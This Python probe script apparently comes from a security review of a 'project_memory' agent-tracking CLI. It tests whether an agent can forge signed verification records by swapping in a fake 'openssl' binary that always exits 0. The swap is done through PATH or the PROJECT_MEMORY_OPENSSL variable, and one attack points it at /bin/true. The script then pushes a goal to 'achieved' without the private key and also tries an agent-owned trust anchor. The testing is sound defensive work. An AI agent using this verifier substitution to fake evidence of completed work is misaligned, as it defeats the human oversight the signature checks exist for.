"""Attack: substitute the `openssl` verifier via PATH / PROJECT_MEMORY_OPENSSL.

The authority module resolves `openssl` with shutil.which() and trusts only its
exit code. An agent that launches the CLI controls its environment. This probe
checks whether a signature the agent cannot produce can be made to "verify" by
substituting the verifier binary -- i.e. whether an agent can mint a trusted
record and drive a Goal to `achieved` without the private key.

Runs as root but executes the CLI as uid 1000 against a root-owned anchor.
"""
from __future__ import annotations

import base64
import hashlib
import json
import os
import shutil
import subprocess
import sys
import tempfile
from pathlib import Path

CODE = Path(sys.argv[1]).resolve()
WORK = Path(sys.argv[2]).resolve()
OUT = Path(sys.argv[3]).resolve()

AGENT_UID = 1000
AGENT_GID = 1000
ANCHOR = Path('/etc/pm-rc3-review/anchor-a.json')
ANCHOR_ID = 'anchor-rc3-a'
ISSUER = 'RC3 Independent Test Signer <signer@test.invalid>'
FAKEBIN = Path('/tmp/pm-rc3-fakebin')

steps: list[dict] = []


def canonical_bytes(value) -> bytes:
    return json.dumps(value, sort_keys=True, ensure_ascii=False,
                      separators=(',', ':')).encode('utf-8')


def payload(record: dict) -> bytes:
    return canonical_bytes({k: v for k, v in record.items() if k != 'authority'})


def sha_hex(data: bytes) -> str:
    return hashlib.sha256(data).hexdigest()


def env_for(path_prefix: str | None = None, openssl: str | None = None) -> dict:
    path = '/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin'
    if path_prefix:
        path = path_prefix + ':' + path
    env = {'PATH': path, 'HOME': str(WORK / 'home'), 'PYTHONPATH': str(CODE),
           'PYTHONUTF8': '1', 'PYTHONDONTWRITEBYTECODE': '1', 'LANG': 'C.UTF-8',
           'GIT_CONFIG_NOSYSTEM': '1', 'PROJECT_MEMORY_TRUST_ANCHOR': str(ANCHOR)}
    if openssl is not None:
        env['PROJECT_MEMORY_OPENSSL'] = openssl
    return env


def cli(label, *args, repo, env):
    proc = subprocess.run([sys.executable, '-m', 'project_memory', *args],
                          cwd=str(repo), capture_output=True, text=True, encoding='utf-8',
                          env=env, user=AGENT_UID, group=AGENT_GID, extra_groups=[])
    rec = {'label': label, 'argv': ['project-memory', *args], 'exit_code': proc.returncode,
           'stdout': proc.stdout[-5000:], 'stderr': proc.stderr[-3000:]}
    steps.append(rec)
    return proc, rec


def sh(*args, repo, env):
    proc = subprocess.run(args, cwd=str(repo), capture_output=True, text=True,
                          encoding='utf-8', env=env, user=AGENT_UID, group=AGENT_GID,
                          extra_groups=[])
    if proc.returncode != 0:
        raise RuntimeError(f'{args}: {proc.returncode}\n{proc.stdout}\n{proc.stderr}')
    return proc.stdout.strip()


def build_case(name: str):
    case = Path(tempfile.mkdtemp(prefix=name + '-', dir=str(WORK)))
    repo = case / 'repo'
    repo.mkdir()
    os.chown(case, AGENT_UID, AGENT_GID)
    os.chown(repo, AGENT_UID, AGENT_GID)
    env = env_for()
    os.makedirs(env['HOME'], exist_ok=True)
    sh('git', 'init', '-q', repo=repo, env=env)
    sh('git', 'config', 'user.email', 'probe@example.invalid', repo=repo, env=env)
    sh('git', 'config', 'user.name', 'Probe', repo=repo, env=env)
    (repo / 'README.md').write_text('hello\n', encoding='utf-8')
    (repo / 'tests').mkdir()
    (repo / 'tests/check.py').write_text('print("check-ok")\n', encoding='utf-8')
    for p in (repo / 'README.md', repo / 'tests', repo / 'tests/check.py'):
        os.chown(p, AGENT_UID, AGENT_GID)
    sh('git', 'add', 'README.md', 'tests/check.py', repo=repo, env=env)
    sh('git', 'commit', '-qm', 'base', repo=repo, env=env)
    base = sh('git', 'rev-parse', 'HEAD', repo=repo, env=env)
    cli('goal_create', 'goal', 'create', '--repo', '.', '--id', 'G-1', '--title', 'x',
        '--outcome', 'ship', '--owner', 'owner', '--criterion', '模块通过测试', repo=repo, env=env)
    cli('run_start', 'run', 'start', '--repo', '.', '--goal', 'G-1', '--task', '325',
        '--run-id', 'run-target', '--agent', 'dev', '--model-provider', 'qodercn',
        '--model-id', 'auto', '--base-sha', base, repo=repo, env=env)
    cli('run_finish', 'run', 'finish', '--repo', '.', '--task', '325', '--run-id', 'run-target',
        '--completed', 'x', '--remaining', 'y', '--head-sha', base, repo=repo, env=env)
    cli('ver_start', 'run', 'start', '--repo', '.', '--goal', 'G-1', '--task', '325',
        '--run-id', 'run-verifier', '--agent', 'verifier', '--model-provider', 'qodercn',
        '--model-id', 'verifier-model', '--base-sha', base, '--role', 'verifier',
        repo=repo, env=env)
    cli('ver_finish', 'run', 'finish', '--repo', '.', '--task', '325', '--run-id', 'run-verifier',
        '--completed', 'x', '--remaining', 'y', '--head-sha', base, repo=repo, env=env)
    test_proc, test = cli('test_run', 'test-run', '--repo', '.', '--commit', base,
                          '--command', 'python3 tests/check.py', '--agent', 'verifier',
                          repo=repo, env=env)
    receipt = json.loads(test_proc.stdout)
    mapping = {'criteria': [{
        'criterion_id': 'C1', 'goal_id': 'G-1', 'task_id': '325',
        'criterion_description': '模块通过测试', 'target_repository': str(repo),
        'target_commit_sha': base, 'evidence_id': 'EV-1', 'evidence_source': 'test',
        'evidence_command': receipt['receipt']['command'],
        'evidence_log': receipt['log'], 'evidence_exit_code': receipt['receipt']['exit_code'],
        'evidence_receipt': receipt['path'], 'execution_status': 'passed',
        'coverage_claim': 'c', 'coverage_review_status': 'human_confirmed',
        'independent_verifier': 'verifier', 'verification_result': 'pass'}]}
    mp = case / 'mapping.json'
    mp.write_text(json.dumps(mapping, ensure_ascii=False), encoding='utf-8')
    os.chown(mp, AGENT_UID, AGENT_GID)
    ver_proc, ver = cli('verify', 'verify', '--repo', '.', '--target-run', 'run-target',
                        '--verifier-run', 'run-verifier', '--standard', '模块通过测试',
                        '--verdict', 'pass', '--evidence-level', 'locally_observed',
                        '--test-receipt', receipt['path'], '--criterion-evidence', str(mp),
                        repo=repo, env=env)
    if ver_proc.returncode != 2:
        raise RuntimeError('verify did not produce a record: '
                           f"exit={ver_proc.returncode} err={ver_proc.stderr[-800:]}")
    ver_obj = json.loads(ver_proc.stdout)
    r0_path = repo / ver_obj['path']
    r0 = json.loads(r0_path.read_text(encoding='utf-8'))
    return repo, base, r0


def bogus_record(r0: dict, vid='VER-bogus', goal_criteria=None) -> dict:
    rec = json.loads(json.dumps(r0))
    rec['verification_id'] = vid
    rec['verified'] = True
    rec['status'] = 'VERIFIED'
    rec['mapping_status'] = 'complete'
    if goal_criteria is not None:
        rec['goal_criteria_sha256'] = goal_criteria
    for e in rec.get('criterion_evidence') or []:
        e['evidence_matched'] = True
    rec.pop('authority', None)
    body = payload(rec)
    rec['authority'] = {
        'status': 'trusted', 'issuer': ISSUER, 'anchor_id': ANCHOR_ID,
        'algorithm': 'rsa-sha256', 'signed_payload_sha256': sha_hex(body),
        'signature_b64': base64.b64encode(b'agent-cannot-produce-this').decode('ascii'),
    }
    return rec


def write_record(repo: Path, rec: dict):
    p = repo / f'.project-memory/verifications/325/{rec["verification_id"]}.json'
    p.parent.mkdir(parents=True, exist_ok=True)
    p.write_text(json.dumps(rec, ensure_ascii=False, indent=1), encoding='utf-8')
    os.chown(p, AGENT_UID, AGENT_GID)
    os.chown(p.parent, AGENT_UID, AGENT_GID)


def main():
    WORK.mkdir(parents=True, exist_ok=True)
    (WORK / 'home').mkdir(parents=True, exist_ok=True)
    os.chown(WORK, AGENT_UID, AGENT_GID)
    os.chown(WORK / 'home', AGENT_UID, AGENT_GID)
    # Agent-owned fake verifier; the agent can write this directory.
    if FAKEBIN.exists():
        shutil.rmtree(FAKEBIN)
    FAKEBIN.mkdir(parents=True, exist_ok=True)
    fake = FAKEBIN / 'openssl'
    fake.write_text('#!/bin/sh\nexit 0\n', encoding='utf-8')
    os.chmod(FAKEBIN, 0o755)
    os.chmod(fake, 0o755)
    os.chown(FAKEBIN, AGENT_UID, AGENT_GID)
    os.chown(fake, AGENT_UID, AGENT_GID)

    results = {}

    # Control: bogus signature, real openssl must reject.
    repo, base, r0 = build_case('ctrl')
    write_record(repo, bogus_record(r0, 'VER-bogus'))
    _, ctrl = cli('control_real_openssl', 'goal', 'evidence', '--repo', '.', '--id', 'G-1',
                  '--criterion', 'C1', '--kind', 'verification', '--ref', 'VER-bogus',
                  repo=repo, env=env_for())
    results['control_real_openssl_exit'] = ctrl['exit_code']
    results['control_rejected'] = ctrl['exit_code'] == 1

    # Attack A: prepend a fake openssl to PATH.
    repo, base, r0 = build_case('path')
    write_record(repo, bogus_record(r0, 'VER-bogus'))
    _, att = cli('attack_path', 'goal', 'evidence', '--repo', '.', '--id', 'G-1',
                 '--criterion', 'C1', '--kind', 'verification', '--ref', 'VER-bogus',
                 repo=repo, env=env_for(path_prefix=str(FAKEBIN)))
    results['path_substitution_exit'] = att['exit_code']
    results['path_substitution_accepted'] = att['exit_code'] == 0

    # Continue the PATH attack all the way to achieved (digest repair re-uses the
    # same fake verifier; no real private key is ever used).
    achieved_exit = None
    if att['exit_code'] == 0:
        goal = json.loads((repo / '.project-memory/goals/G-1.json').read_text(encoding='utf-8'))
        digest = sha_hex(canonical_bytes(goal.get('success_criteria', [])))
        write_record(repo, bogus_record(r0, 'VER-bogus', goal_criteria=digest))
        _, ev = cli('attack_path_evaluate', 'goal', 'evaluate', '--repo', '.', '--id', 'G-1',
                    repo=repo, env=env_for(path_prefix=str(FAKEBIN)))
        cli('attack_path_approved', 'goal', 'transition', '--repo', '.', '--id', 'G-1',
            '--to', 'approved', '--approved-by', 'agent@example.invalid',
            repo=repo, env=env_for(path_prefix=str(FAKEBIN)))
        cli('attack_path_active', 'goal', 'transition', '--repo', '.', '--id', 'G-1',
            '--to', 'active', repo=repo, env=env_for(path_prefix=str(FAKEBIN)))
        cli('attack_path_evaluating', 'goal', 'transition', '--repo', '.', '--id', 'G-1',
            '--to', 'evaluating', repo=repo, env=env_for(path_prefix=str(FAKEBIN)))
        _, ach = cli('attack_path_achieved', 'goal', 'transition', '--repo', '.', '--id', 'G-1',
                     '--to', 'achieved', '--approved-by', 'agent@example.invalid',
                     repo=repo, env=env_for(path_prefix=str(FAKEBIN)))
        achieved_exit = ach['exit_code']
        results['path_evaluate_exit'] = ev['exit_code']
        results['path_achieved_exit'] = achieved_exit
        results['path_goal_status'] = json.loads(
            (repo / '.project-memory/goals/G-1.json').read_text(encoding='utf-8'))['status']

    # Attack B: PROJECT_MEMORY_OPENSSL points at the fake binary.
    repo, base, r0 = build_case('env')
    write_record(repo, bogus_record(r0, 'VER-bogus'))
    _, envatt = cli('attack_env_openssl', 'goal', 'evidence', '--repo', '.', '--id', 'G-1',
                    '--criterion', 'C1', '--kind', 'verification', '--ref', 'VER-bogus',
                    repo=repo, env=env_for(openssl=str(fake)))
    results['env_openssl_exit'] = envatt['exit_code']
    results['env_openssl_accepted'] = envatt['exit_code'] == 0

    # Attack B2: the env var points at an ordinary root-owned executable that
    # always exits 0 (`/bin/true`).  No attacker binary is needed.
    repo, base, r0 = build_case('envtrue')
    write_record(repo, bogus_record(r0, 'VER-bogus'))
    _, envtrue = cli('attack_env_true', 'goal', 'evidence', '--repo', '.', '--id', 'G-1',
                     '--criterion', 'C1', '--kind', 'verification', '--ref', 'VER-bogus',
                     repo=repo, env=env_for(openssl='/bin/true'))
    results['env_true_exit'] = envtrue['exit_code']
    results['env_true_accepted'] = envtrue['exit_code'] == 0

    # Attack C: agent writes its own anchor AND supplies its own public key while
    # keeping the anchor outside the repo. The protection should reject it as
    # agent-owned (defence in depth), so this must fail.
    agent_anchor = WORK / 'agent-anchor.json'
    shutil.copyfile(ANCHOR, agent_anchor)
    os.chown(agent_anchor, AGENT_UID, AGENT_GID)
    os.chmod(agent_anchor, 0o444)
    repo, base, r0 = build_case('ownanchor')
    # Re-sign nothing: still a bogus signature, but point at the agent's anchor.
    write_record(repo, bogus_record(r0, 'VER-bogus'))
    env = env_for()
    env['PROJECT_MEMORY_TRUST_ANCHOR'] = str(agent_anchor)
    _, own = cli('attack_agent_anchor', 'goal', 'evidence', '--repo', '.', '--id', 'G-1',
                 '--criterion', 'C1', '--kind', 'verification', '--ref', 'VER-bogus',
                 repo=repo, env=env)
    results['agent_owned_anchor_exit'] = own['exit_code']
    results['agent_owned_anchor_rejected'] = own['exit_code'] == 1

    OUT.parent.mkdir(parents=True, exist_ok=True)
    OUT.write_text(json.dumps({'results': results, 'steps': steps},
                              ensure_ascii=False, indent=2), encoding='utf-8')
    print(json.dumps(results, ensure_ascii=False, indent=2))


if __name__ == '__main__':
    main()
